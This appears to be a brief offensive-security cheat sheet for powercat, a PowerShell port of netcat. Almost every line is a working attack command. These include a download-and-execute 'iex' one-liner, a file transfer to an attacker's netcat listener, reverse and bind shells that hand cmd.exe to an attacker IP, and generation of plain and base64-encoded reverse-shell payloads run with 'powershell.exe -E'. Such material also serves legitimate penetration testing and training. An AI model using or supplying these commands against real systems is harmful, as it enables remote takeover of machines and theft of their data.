PowerShell version of Netcat

Kali linux

apt install powercat

/usr/share/windows-resource/powercat




Windows

1. Load the function

PS> . .\powercat.ps1

or

PS> iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')



2. execute

PS> powercat -h


File transfer

receiver
sudo nc -lvnp 443 > receiving_data.txt

sender
powercat -c <receiver ip> -p 443 -i C:\Users\test\data.txt


Reverse shell

attacker

sudo nc -lvp 443

victim

powercat -c <ip attacker> -p 443 -e cmd.exe




Bind shell

victim
powercat -l -p 443 -e cmd.exe


attacker

nc <victim ip> 443


Generate payload with powercat

PS> powercat -c <ip attacker> -p 443 -e cmd.exe -g > reverseshell.ps1

PS> ./reverseshell.ps1


PS> powercat -c <ip attacker> -p 443 -e cmd.exe -ge > encoded_reverseshell.ps1


PS> powershell.exe -E <base64 payload>
